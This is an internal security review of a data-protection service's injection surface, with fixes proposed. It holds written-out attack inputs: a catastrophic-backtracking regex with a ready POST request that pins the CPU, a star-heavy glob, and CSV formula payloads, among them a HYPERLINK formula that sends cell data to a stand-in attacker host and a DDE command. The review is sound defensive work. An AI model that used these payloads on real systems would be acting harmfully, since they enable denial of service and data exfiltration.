# S3 — Security review (lens: injection) — branch `fsec`

**Scope:** M0–M3 + M5 on branch `fsec` (= current main). Injection lens: SQL selections
(PostgreSQL + Oracle), MongoDB filters/pipelines, policy-supplied regexes (ReDoS), CSV exports
(formula injection), PDF markup, HTML evidence (XSS), path handling for artefacts/exports. Also
M5 plan Task 17 S1–S13 items that fall in this lens.

**Method:** read the code; wrote offline probes under
`~/.cache/dps-build/reports/S3-injection/` and ran them via `./lane.sh` (no server needed — they
exercise the exact validators/matchers the API calls). No repository files modified.

**Headline:** M5 plan **Task 17 was never executed as a task** — `dps/engine/detect/regex_guard.py`,
`dps/layers/api/validation.py`, the whole `tests/security/` tree, `tests/test_no_values_in_logs_m5.py`
and `docs/security/2026-10-11-m5-security-review.md` are all absent. Several S-items are nonetheless
covered organically elsewhere (see status table). But **S3 (ReDoS) is a real, confirmed, exploitable
gap**, and **S9's guard was applied to the audit CSV but not to the bulk data export**. The SQL
selection validators and the HTML-evidence escaping are strong and hold against the adversarial
corpus.

---

## Finding 1 (HIGH) — ReDoS via policy-supplied recognizer regex (S3 unimplemented)

**File:** `dps/engine/detect/custom.py` — `PatternSpecModel._compiles` (lines 53–60);
matcher `PolicyCustomDetector.scan` (lines 194–230). Reached from
`dps/layers/api/routers/entities.py::test_recognizer` (line 103, scope `detect`) and from the main
engine path `dps/engine/service.py:288` (`custom_detector_from(policy.detect.custom_recognizers, …)`).

**Claim:** `PatternSpecModel._compiles` only runs `re.compile(value)` — it does **not** call any
ReDoS/structure guard (the planned `regex_guard.check_pattern` does not exist). A caller-supplied
recognizer regex with catastrophic backtracking is accepted and then run with `re.finditer` on
caller-supplied text. Python `re` has no timeout, so one request pins a CPU. Worse, a stored
policy's `custom_recognizers` run on **every** `/detect` and `/obfuscate` call that uses that
policy, over arbitrary request text — a persistent DoS that pins worker/app CPUs shared across
tenants. `test-recognizer` is a sync route, so it also starves the request threadpool.

**Exploit / evidence** (`S3-injection/redos_probe.py`, run via `./lane.sh python …`):
```
evil pattern: '(a+)+$'  (len 6; API cap is 500 chars, text cap 20000)
accepted by DPS recognizer validation: True
scan() wall-clock vs input length:
  n= 18:   0.009s
  n= 22:   0.150s
  n= 26:   2.407s
  n= 30:  38.779s    (grows ~16x per +4 chars; a ~40-char input never returns)
```
`POST /api/v1/policies/test-recognizer` with `{"recognizer": {"name":"x",
"supported_entity":"EMPLOYEE_ID", "patterns":[{"name":"p","regex":"(a+)+$","score":0.5}]},
"text":"<~40 'a' chars>"}` pins a CPU indefinitely; the same pattern stored in a policy's
`custom_recognizers` pins a CPU on every detect/obfuscate request.

**Fix:** implement the planned `dps/engine/detect/regex_guard.py::check_pattern` (static walk of the
`re` parse tree: refuse length > 512, backreferences/conditional groups, repeat bounds > 1000, and
an unbounded repeat nested inside a repeat whose bound > 3 — the plan gives the exact code in Task
17), and call it from `PatternSpecModel._compiles` after `re.compile`, re-raising `UnsafePattern`
as `ValueError`. Add `tests/security/test_regex_guard.py` (the plan's corpus). A time budget on the
matcher (`max_text_chars` already caps input but does not bound backtracking) is a weaker backstop,
not a substitute.

---

## Finding 2 (MEDIUM) — ReDoS via policy-supplied declared-field path glob

**File:** `dps/engine/detect/custom.py` — `path_glob` (lines 122–136) and `DeclaredField.path`
(line 106, a bare `str` with **no length/validation constraint**). `path_glob` is run per field
path during discovery/classification via `PolicyCustomDetector.declared()` (line 187,
`glob.fullmatch(path)`). `declared_fields` is policy-author-controlled
(`dps/engine/policy.py:103`).

**Claim:** `path_glob` turns each `*` into `[^.\[\]]*` with no cap on the number of `*`. A glob of
many adjacent stars compiles to many adjacent unbounded repeats on the same character class —
polynomial/exponential backtracking on a long dotless path segment (field/column names run to
63 chars in PostgreSQL, 128 in Oracle). `DeclaredField(path="*"*25+"x")` is accepted with no
validation.

**Exploit / evidence** (`S3-injection/pathglob_probe2.py`):
```
DeclaredField(path='*************************x') accepted: YES (no validation)
stars= 3 subjlen=10: 0.0000s
stars=10 subjlen=20: 0.1723s
stars=15 subjlen=24: HUNG >5s      (and a 25-star glob did not finish inside a 60s kill)
```
A policy whose `declared_fields[].path` is `"*"*25` makes classification of any schema that has one
long, dot-free path segment hang, pinning a shared worker CPU.

**Fix:** validate `DeclaredField.path` at model level — cap its length (e.g. ≤ 256) and the number
of `*` (e.g. ≤ 8), and/or collapse adjacent `*` to a single `[^.\[\]]*` when compiling (adjacent
stars are redundant anyway). Add a test with a star-heavy glob against a long segment.

---

## Finding 3 (MEDIUM) — CSV formula injection in the L2 `files` data export (S9 half-applied)

**File:** `dps/layers/connectors/files.py` — `_text_value` (lines 76–90) and `_emit`
(line 208, `self._writer.writerows([[_text_value(r.get(n)) …]])`). Contrast
`dps/audit_query.py::csv_cell` (lines 105–110), which **is** applied to the audit CSV export
(`dps/audit_query.py:245`).

**Claim:** the `files` write mode exports transformed rows to CSV with `csv.writer` and raw
`_text_value` (plain `str(value)`), with **no formula-injection guard**. A "kept" (non-sensitive,
pass-through) text column whose source value begins with `=`, `+`, `-`, `@`, TAB or CR is written
verbatim. When a bank analyst opens the exported CSV in Excel/LibreOffice/Sheets the cell is
evaluated — second-order (stored) CSV injection: data exfiltration via `=HYPERLINK(...)` /
`=WEBSERVICE(...)`, or legacy DDE (`=cmd|'/c …'!A1`). The M5 plan's S9 fix (`csv_cell`) guards the
audit CSV but was never applied to this bulk-data path, which is exactly the export a customer
opens in a spreadsheet.

**Exploit / failure scenario:** a customer sets a free-text source field (e.g. a `notes` or
`display_name` column that classification keeps as non-personal) to
`=HYPERLINK("http://attacker.example/"&A1,"open me")`. An `obfuscate`/`synthesize` run in `files`
mode copies that kept column verbatim into `part-*.csv`; opening the export triggers the formula.

**Fix:** guard string cells on CSV export the way `csv_cell` does — prefix a leading `'` when a
**string** cell starts with `= + - @ \t \r` (do **not** blind-prefix numeric/date/bool cells, which
`_text_value` already renders in non-formula forms, to avoid corrupting numeric columns). Only the
`csv` format needs it; `parquet`/`json` exports are not spreadsheet-evaluated. Add an export test
asserting a dangerous leading char is neutralised.

---

## Task 17 (S1–S13) status within the injection lens

| # | Area (lens?) | Status on `fsec` |
|---|---|---|
| S1 | 422 echoes input (logs — adjacent) | **Addressed** elsewhere: `dps/app.py::_validation_error` returns `{type,loc,msg}` only, dropping `input`/`ctx`/`url`. (No `validation.py`; no test.) |
| S3 | **policy regex ReDoS (in lens)** | **UNADDRESSED → Finding 1** (+ glob variant Finding 2). No `regex_guard.py`, no `check_pattern` call, no test. |
| S4 | **selection injection (in lens)** | **Control present and holds.** `selection.validate_selection` / `quote_ident` / `validate_mongo_filter` refuse the full plan corpus on both dialects and the extra cases I added (see `selection_probe.py`); column re-mapping (`AS c(a,b)`, UNPIVOT/PIVOT/MATCH_RECOGNIZE, CTE column lists, cross-column alias) all refused `selection_query_alias`. Dedicated `tests/security/test_selection_injection.py` **missing** (test gap only). |
| S9 | **CSV formula injection (in lens)** | Audit CSV **addressed** (`csv_cell`); bulk `files` export **UNADDRESSED → Finding 3**. |
| S10 | **PDF markup (in lens)** | **Addressed.** `dps/layers/reports/pdf.py::pdf_text` XML-escapes (`xml.sax.saxutils.escape`) and every `Paragraph` goes through `_p`→`pdf_text`; raw `_fold` is used only on canvas `drawString` (no markup parser). |
| S13 | value-free logs incl. regex guard/netguard/selection (partly in lens) | Selection errors are value-free (messages never quote SQL — verified). `test_no_values_in_logs_m5.py` **missing** (test gap). |

Out-of-lens S-items (left to the other finders): S2 secret `repr` — note in passing: most secret
settings (`api_keys`, `coin_client_secret`, `pg_password`, `job_kek`, `job_kek_previous`) are plain
`str` **without** `repr=False` in `dps/config.py`, so `repr(Settings)` would print them (only
`tokenizer_token` has `repr=False`); belongs to the secrets/logs finder. S5 SSRF (`dps/netguard.py`
present) → SSRF finder. S6/S7/S8 auth/tenancy/key-admin → auth finder. S11/S12 headers/exposure →
posture finder.

## Things checked and found SOUND (no finding)

- **Path handling (artefacts + exports):** `dps/storage.py::check_key` (`_KEY_RE`, rejects
  `""`/`.`/`..` segments, no backslash/space) is applied by both `LocalObjectStore` and
  `S3ObjectStore` on `put/get/stream/delete/exists`; `LocalObjectStore._path` resolves and enforces
  `root in parents`; `target_store` (pvc) resolves `root/base_path` and rejects escapes (symlinks
  included). `files.py` composes keys from `base_prefix`/`spec.prefix`/`job_id` but every write
  passes through `check_key`, so a `..` in a prefix is refused at write time. No traversal.
- **SQL builders:** every identifier is quoted via `selection.quote_ident` / Oracle `qcol`
  (validated, rejects `"`/NUL/bad chars); every value is a bind; every numeric interpolated into SQL
  text (`LIMIT`, `OFFSET`, `TABLESAMPLE`, `SAMPLE`/`SEED`, hash seed/percent) is `int`/`float`-coerced.
- **MongoDB:** `validate_mongo_filter` allow-lists operators and refuses `$where`/`$expr`/
  `$function`/`$accumulator`/`$jsonSchema`/`$near` anywhere in the tree; `$regex` capped at 256 chars;
  the only aggregation `pipeline` (`mongo.py::_sample_docs`) takes `then` internally
  (`[{"$sort":{"_id":1}}]`), never from the caller.
- **HTML evidence (XSS):** `dps/layers/connectors/evidence.py::render_html` routes **every** dynamic
  value through `_cell` = `html.escape(str(value))` (quote=True); served with
  `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'` (no script-src) and
  `Cache-Control: no-store`; the artefact copy is served `Content-Disposition: attachment`. No XSS.

## Probes (durable)
`~/.cache/dps-build/reports/S3-injection/redos_probe.py`, `pathglob_probe2.py`,
`selection_probe.py` (+ `pathglob_probe.py`). Run offline via `./lane.sh python <file>` from
`dps-wt-fsec`.
